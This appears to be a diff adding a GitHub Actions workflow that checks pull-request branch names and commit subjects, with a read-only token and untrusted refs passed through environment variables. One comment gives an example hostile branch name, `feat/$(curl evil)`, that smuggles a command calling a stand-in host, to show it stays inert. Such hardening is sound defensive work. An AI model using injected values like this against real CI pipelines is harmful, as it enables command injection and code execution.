@@ -1,0 +1,52 @@
+name: PR conventions
+
+# Branch names and commit subjects follow the same type list as the PR title
+# check in pr-title.yml. The title check stays in that file because it runs on
+# pull_request_target; these jobs read PR code and refs, so they use the plain
+# pull_request trigger with a read-only token.
+
+on:
+  pull_request:
+    types: [opened, edited, reopened, synchronize]
+
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  branch:
+    name: branch name
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+      # The branch name never goes into the script text: it is passed through
+      # env and quoted, so a name like `feat/$(curl evil)` stays inert.
+      - name: Check branch name
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+          # Fork PRs only get a warning. The branch name is the contributor's
+          # and often cannot be helped (`main`, `patch-1` from the GitHub web
+          # editor); with squash merges it never reaches history, so blocking a
+          # first-time contributor gains nothing. Same-repo branches are
+          # enforced.
+          WARN_ONLY: ${{ github.event.pull_request.head.repo.fork && '1' || '0' }}
+        run: scripts/check-branch-name.sh "$HEAD_REF"
+
+  commits:
+    name: commit messages
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+          persist-credentials: false
+      - name: Check commit subjects
+        env:
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          # Same reasoning as the branch name: a fork's commits (for example
+          # "Update README.md" from the web editor) are squashed away on merge.
+          WARN_ONLY: ${{ github.event.pull_request.head.repo.fork && '1' || '0' }}
+        run: scripts/check-commit-messages.sh "$BASE_SHA" "$HEAD_SHA"
